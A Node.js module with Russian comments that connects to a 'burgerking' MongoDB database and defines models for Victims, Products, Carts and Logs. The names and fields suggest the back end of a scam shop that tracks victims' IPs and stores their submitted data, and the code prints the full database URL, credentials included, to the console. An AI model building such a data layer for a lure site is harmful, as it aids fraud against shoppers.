const mongoose = require('mongoose');

// Локальная разработка - SQLite, Railway - MongoDB
const isProduction = process.env.NODE_ENV === 'production' || process.env.RAILWAY_ENVIRONMENT;
const isRailway = process.env.RAILWAY_ENVIRONMENT;

const mongoUrl = isRailway ? 
  process.env.MONGO_URL || process.env.MONGODB_URL || process.env.DATABASE_URL :
  'mongodb://localhost:27017/burgerking';

// Исправляем URL если он не содержит протокол
const getCorrectMongoUrl = (url) => {
  if (!url) return url;
  
  // Если URL уже содержит протокол, возвращаем как есть
  if (url.startsWith('mongodb://') || url.startsWith('mongodb+srv://')) {
    return url;
  }
  
  // Если это внутренний Railway URL, добавляем протокол
  if (url.includes('mongodb.railway.internal')) {
    return `mongodb://${url}`;
  }
  
  // Для других случаев добавляем mongodb://
  return `mongodb://${url}`;
};

// Подключение к MongoDB
async function connectMongoDB() {
  try {
    console.log('🔄 Подключение к MongoDB...');
    console.log('📍 MONGO_URL:', process.env.MONGO_URL ? 'SET' : 'NOT SET');
    console.log('📍 MONGODB_URL:', process.env.MONGODB_URL ? 'SET' : 'NOT SET');
    console.log('📍 DATABASE_URL:', process.env.DATABASE_URL ? 'SET' : 'NOT SET');
    
    const correctedUrl = getCorrectMongoUrl(mongoUrl);
    console.log('📍 Original URL:', mongoUrl);
    console.log('📍 Corrected URL:', correctedUrl);
    
    await mongoose.connect(correctedUrl);
    console.log('✅ MongoDB подключена успешно');
    return true;
  } catch (error) {
    console.error('❌ Ошибка подключения к MongoDB:', error.message);
    return false;
  }
}

// Схемы для MongoDB
const victimSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  ip: { type: String, required: true },
  discount: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const productSchema = new mongoose.Schema({
  title: { type: String, required: true },
  description: { type: String, required: true },
  price: { type: Number, required: true },
  image: { type: String, required: true },
  tag: { type: String, required: true, unique: true },
  createdAt: { type: Date, default: Date.now }
});

const cartSchema = new mongoose.Schema({
  victimId: { type: String, required: true },
  productId: { type: String, required: true },
  title: { type: String, required: true },
  price: { type: Number, required: true },
  quantity: { type: Number, default: 1 },
  createdAt: { type: Date, default: Date.now }
});

const logSchema = new mongoose.Schema({
  victimId: { type: String, required: true },
  status: { type: String, default: 'pending' },
  data: { type: Object, default: {} },
  createdAt: { type: Date, default: Date.now }
});

// Модели
const Victims = mongoose.model('Victims', victimSchema);
const Products = mongoose.model('Products', productSchema);
const Carts = mongoose.model('Carts', cartSchema);
const Logs = mongoose.model('Logs', logSchema);

module.exports = {
  connectMongoDB,
  Victims,
  Products,
  Carts,
  Logs,
  mongoose
};
